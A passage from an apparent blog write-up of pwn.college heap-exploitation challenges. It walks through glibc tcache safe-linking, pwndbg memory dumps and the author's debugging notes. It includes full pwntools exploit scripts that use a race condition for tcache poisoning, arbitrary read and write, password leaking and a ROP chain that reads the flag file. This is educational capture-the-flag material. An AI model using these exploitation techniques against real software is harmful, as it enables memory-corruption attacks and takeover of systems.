class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#this is the return address of vuln in thread. thus the *stored* rip.</span><br>stored_rip_address = libc_base - <span class="hljs-number">0x4138</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: STORED_RIP_ADDRESS:&quot;</span>, <span class="hljs-built_in">hex</span>(stored_rip_address))<br>addr_in_binary = arbitrary_read(r1，r2,stored_rip_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: ADDR IN BINARY:&quot;</span>, <span class="hljs-built_in">hex</span>(addr_in_binary))<br>bin_base = addr_in_binary - <span class="hljs-number">0x172f</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: BINARY BASE: &quot;</span>, <span class="hljs-built_in">hex</span>(bin_base))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!!!!! LET&#x27;S ROLLING !!!!!!&quot;</span>)<br><span class="hljs-comment">#new technique</span><br>libc = p.elf.libc<br>libc.address = libc_base<br>pwn.context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\xoc\xod\xoe\x20&quot;</span>)<br>rop.call( <span class="hljs-string">&quot;close&quot;</span>,[<span class="hljs-number">3</span>]) <span class="hljs-comment"># used for correctly execute sendfile.</span><br>rop.call( <span class="hljs-string">&quot;read&quot;</span>，[<span class="hljs-number">0</span>,libc.bss(<span class="hljs-number">0x123</span>)，<span class="hljs-number">42</span>])<br>rop.call( <span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>)，<span class="hljs-number">0</span>])<br>rop.call( <span class="hljs-string">&quot;sendfile&quot;</span>，[<span class="hljs-number">1</span>，<span class="hljs-number">3</span>，<span class="hljs-number">0</span>，<span class="hljs-number">1024</span>])<br>rop.call( <span class="hljs-string">&quot;exit&quot;</span>,[<span class="hljs-number">42</span>])<br><br>arbitrary_write(r1，r2，stored_rip_address, rop.chain())<br>r1.sendline( <span class="hljs-string">&quot;quit&quot;</span>)<br>p.send( <span class="hljs-string">&quot;/flag\0&quot;</span>)<br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;LEAKED:&quot;</span>, p.readall())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EXITED: &quot;</span>, p.poll())<br></code></pre></div></td></tr></table></figure><p>finally, i come to the last module level.</p><h4 id="level1-4"><a href="#level1-4" class="headerlink" title="level1"></a><del>level1</del></h4><p>emmmmmm, i thought i have to write the script above by my own hand.</p><p>failed to test the above program in kali2021, maybe the source code of tache is changed.</p><p>Ohhhhhh, i forget the thread local var is in high address space, so the tcache contains ‘\x7f’.</p><p>we can get the constant offset of libc and thread tcache address(0x7f44ac0008d0):</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#print the content of the chunk.</span><br>pwndbg&gt; x/<span class="hljs-number">4</span>gx <span class="hljs-number">0x7f44ac000f20</span><br><span class="hljs-number">0x7f44ac000f20</span>: <span class="hljs-number">0x00000007f44ac000</span>      <span class="hljs-number">0x00007f44ac0008d0</span><br><span class="hljs-number">0x7f44ac000f30</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></div></td></tr></table></figure><img src="../../image/pwn-modules/image-20220603165348772.png" alt="image-20220603165348772" style="zoom:80%;" /><p>we can notice that the first 8 bytes of the chunk is 0x00007f44ac000, which is not a valid high layout address. because libc 2.33 uses a newer technique: PROTECT_PTR macro. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">   larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">   still works.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br>  <span class="hljs-comment">//and one line difference in tcache_put()!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>the pwncollege server is using libc-2.31, which matches with ubuntu20.04. and this version doesn’t have PROTECT_PTR macro.</p><p>the result on my kali2021 is:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#this is tcache next pointer(with padded address)</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x00000007f44ac000000</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7f44ac000000</span>     <span class="hljs-number">0x7f44ac021000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap <span class="hljs-number">3</span>:<span class="hljs-number">1</span>] +<span class="hljs-number">0x0</span><br><span class="hljs-meta">#this is tcache struct</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x00007f44ac0008d0</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7f44ac000000</span>     <span class="hljs-number">0x7f44ac021000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap <span class="hljs-number">3</span>:<span class="hljs-number">1</span>] +<span class="hljs-number">0x8d0</span><br></code></pre></div></td></tr></table></figure><p>we continue to check the content of address 0x00007f44ac0008d0 to look up for libc-based address, which is appeal to us.</p><blockquote><p>by <code>x/512gx 0x00007f44ac0008d0</code>, we can found the useful addresses in higher space than heap. just take one. and use the offset among known addresses to calc more addresses.</p></blockquote><p>Okay, the beginning of the heap stores some infomation containing a pointer to main_arena. so we should use <code>x/512gx 0x00007f44ac000000</code>, which is page-aligned version of previous one.</p><p>then we can find this:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">in founded address:<br><span class="hljs-comment">/*0x7f055c000880: 0x0000000000000000      0x0000000000000000*/</span>     <br># <span class="hljs-number">0x7f055c000890</span>: <span class="hljs-number">0x00007f0563ef5ba0</span>      <span class="hljs-number">0x0000000000000000</span>      <br><span class="hljs-comment">/*0x7f055c0008a0: 0x0000000000000001      0x0000000000021000*/</span><br><span class="hljs-keyword">and</span> in maps:<br><span class="hljs-comment">/*  0x7f0563d38000     0x7f0563d5e000 r--p    26000 0      /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="hljs-comment">    0x7f0563d5e000     0x7f0563ea6000 r-xp   148000 26000  /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="hljs-comment">    0x7f0563ea6000     0x7f0563ef1000 r--p    4b000 16e000 /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="hljs-comment">    0x7f0563ef1000     0x7f0563ef2000 ---p     1000 1b9000 /usr/lib/x86_64-linux-gnu/libc-2.33.so*/</span><br>#   <span class="hljs-number">0x7f0563ef2000</span>     <span class="hljs-number">0x7f0563ef5000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">1b</span>9000 /usr/lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.33</span>.so<br><span class="hljs-comment">/*  0x7f0563ef5000     0x7f0563ef8000 rw-p     3000 1bc000 /usr/lib/x86_64-linux-gnu/libc-2.33.so*/</span><br></code></pre></div></td></tr></table></figure><p>These two are perfectly matched. and now we find the main_arena’s address.</p><h4 id="level1-5"><a href="#level1-5" class="headerlink" title="level1"></a>level1</h4><p>the additional command is send_flag, which calls <code>load_secret()</code> and <code>strcmp()</code> to check whether the pwd is correct. the answer is a randomized string taking the flag as seed.  wont change between runnings. </p><p>in this level, the pwd is stored into bss segment in main function.</p><blockquote><p><strong>Thinking process:</strong> </p><p>we must leak the pwd through arbitrary read, and before the read we should also get the stack pointer of some stack frame.</p><p>and the secret_correct’s stack frame base is a constant offset by libc base which is 0x4640 in my kali2021. the pwd is stored in <code>ebp-0x20</code>, and  the length is 16 bytes.</p><p>but secret_correct() has stack reuse protection: <code>memset(s2, 0, 0x11uLL)</code> to set pwd string to NULL.</p><p>emmmm………………….. should i try a race to read pwd before he clears out the PWD s2? I think not. </p><p>I can <strong>change the return address</strong> of <code>challenge()</code> to <code>win()</code> after using quit command. by using the function’s ebp i can easily locate it.</p></blockquote><p>or, in this level, main function puts the pwd into 0x405655, where we can directly read out from.</p><blockquote><p>wtf, when i try to read the main_arean_addr, the value stored there begins with ‘\x0a’, which means ‘\n’ and will stop printf to print all the rest chars.<br><code>pwndbg&gt; x/8bx 0x00007fbc88000890</code><br><code>0x7fbc88000890: 0xa0    0x9b    0x1a    0x8f    0xbc    0x7f    0x00    0x00</code> </p><p>Okay, that’s beccause i use the recvline, it will stop at the carrige return.</p></blockquote><p>so we should use r1.clean() to receive message.</p><blockquote><p><strong>why would the printf print out the null bytes??????</strong> Im so confused. </p><p>ohhhh, i think i get the point. before the printf prints out a string, it will check the string length by locating the null byte. and then it will call the write syscall to prints out all bytes(such as null byte).  but in race condition, with previously filled AAAAAAAABBBBBBBB, after passing the length check, now printf is scheduled to free.  then the ‘string’ is a tcache_perthread_ptr, the write syscall will directly prints it out.</p></blockquote><p><del>but we can’t read the null byte in, nor the white characters</del>.<b style="color:red">we can scanf null bytes into the buffer. the scanf simply adds a \0 to the end of the string, without checking whether there are null bytes in it </b>.what a surprise.</p><p><strong>Again, i forgot the libc version on my kali is 2.33. stucked in why tcache poisoning don’t work, neglected the PROTECT_PTR macro.</strong> </p><p>but i figure out that the chunk 0 is at a constant offset from the tcache_perthread_struct address, which is 0x650. the tcache link at the end of controlled_allocation is like this: <code>tcache_entry[i]-&gt;chunk_0-&gt;packed address</code> </p><img src="../../image/pwn-modules/image-20220619123546515.png" alt="image-20220619123546515" style="zoom:80%;" /><p>and what we all need is addr(@packed) and chunk0 addr(now we get it), and then perform calc like this: <code>(addr&gt;&gt;12)^packed</code>. </p><p>but the second time using arbitrary read it says: <code>malloc(): unaligned tcache chunk detected</code> , that’s because the target 0x405655 is not aligned with 16 bytes in x86-64 machine. however, using 0x405650 as string start address will encounter the problem that it starts with the null bytes.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> x/21bc 0x405650</span><br>0x405650 &lt;secret+80&gt;:   0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 109 &#x27;m&#x27; 108 &#x27;l&#x27; 116 &#x27;t&#x27;<br>0x405658 &lt;secret+88&gt;:   122 &#x27;z&#x27; 102 &#x27;f&#x27; 118 &#x27;v&#x27; 114 &#x27;r&#x27; 102 &#x27;f&#x27; 113 &#x27;q&#x27; 103 &#x27;g&#x27; 106 &#x27;j&#x27;<br>0x405660 &lt;secret+96&gt;:   120 &#x27;x&#x27; 118 &#x27;v&#x27; 107 &#x27;k&#x27; 112 &#x27;p&#x27; 101 &#x27;e&#x27;<br></code></pre></div></td></tr></table></figure><p>so we could use arbitrary_write() to change address stored in message[2], and <del>only need to change the last byte</del>. scanf will read in null byte, so it needs full address to be packed.</p><p>finally, i use this plan(as follows). change the message’s content to another place where we want to overwrite. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">r1.sendline(<span class="hljs-string">b&#x27;malloc 2&#x27;</span>) <span class="hljs-comment">#make sure it exists.</span><br>arbitrary_write(r1, r2, <span class="hljs-number">0x405220</span>+<span class="hljs-number">0x10</span>, <span class="hljs-number">0x405655</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;printf 2&#x27;</span>) <span class="hljs-comment">#print it out.</span><br>r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>pwd = r1.clean() <span class="hljs-comment">#finally we get the pwd.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PWD : &quot;</span>, pwd)<br>r1.sendline(<span class="hljs-string">b&#x27;send_flag &#x27;</span>+pwd) <br></code></pre></div></td></tr></table></figure><p>full exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.5</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr, idx_=<span class="hljs-literal">None</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> idx_ == <span class="hljs-literal">None</span>: <span class="hljs-comment">#嗯, 好像没什么用.</span><br>        idx_ = idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>    chunk_idx_addr = perthread_leak + <span class="hljs-number">0x650</span> + <span class="hljs-number">0x410</span>*idx<br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx_&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx_&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx_&#125;</span>&#x27;</span>)<br>    idx = idx_ + <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, idx_=<span class="hljs-literal">None</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> idx_ == <span class="hljs-literal">None</span>: <span class="hljs-comment">#嗯, 好像没什么用.</span><br>        idx_ = idx<br>    controlled_allocation(r1, r2, addr, idx_)<br>    r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx_-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    controlled_allocation(r1, r2, addr)<br>    <span class="hljs-comment">#这里忘加上context.binary的设置直接给我默认i386架构, value给我4字节对齐</span><br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat([value]))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level1.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level1.0.elf64&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span> ).read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br><span class="hljs-comment">#main_arena_ptr_address = perthread_leak - 0x8d0 + 0x890</span><br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;b *challenge+0x19b\nb *challenge+0x302\ninit-pwndbg\nc\n&quot;)</span><br><span class="hljs-comment">#main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&quot;MAIN ARENA ADDR: &quot;, hex(main_arena_addr))</span><br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;b challenge+0x10b\ninit-pwndbg\nc\n&quot;)</span><br><span class="hljs-comment">#libc_base = main_arena_addr - 0x1bdba0</span><br><span class="hljs-comment">#print(&#x27;LIBC BASE: &#x27;, hex(libc_base))</span><br><span class="hljs-comment">#secretCorrect_frame_base = libc_base - 0x4640</span><br><span class="hljs-comment">#print(&quot;SECRET FRAME BASE: &quot;, hex(secretCorrect_frame_base))</span><br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;b *challenge+0x19b\nb *challenge+0x302\ninit-pwndbg\nc\n&quot;)</span><br><span class="hljs-comment">#arbitrary_read(r1, r2, 0x405650, 2)</span><br>r1.sendline(<span class="hljs-string">b&#x27;malloc 2&#x27;</span>)<br>arbitrary_write(r1, r2, <span class="hljs-number">0x405220</span>+<span class="hljs-number">0x10</span>, <span class="hljs-number">0x405655</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;printf 2&#x27;</span>)<br>r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>pwd = r1.clean()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PWD : &quot;</span>, pwd)<br>r1.sendline(<span class="hljs-string">b&#x27;send_flag &#x27;</span>+pwd)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> r1.clean().split(<span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> a))<br>pwn.gdb.attach(p, <span class="hljs-string">&quot;init-pwndbg\n&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>there is no difference between .0 and .1 level. </p><h4 id="level2-4"><a href="#level2-4" class="headerlink" title="level2"></a>level2</h4><p>protections are all turned on.</p><p>there is no <code>load_secret()</code> function in main, so the last way may be rewriting the retrun address of <code>challenge()</code>.</p><p>for test:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">p/d (<span class="hljs-keyword">int</span>[<span class="hljs-number">15</span>])stored<br>p/x (<span class="hljs-keyword">char</span>*[<span class="hljs-number">15</span>])messages<br></code></pre></div></td></tr></table></figure><p>it’s so hard to do with libc-2.33. the memory align check is annoying. just assuming that the binary base is already known.</p><p>fail exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 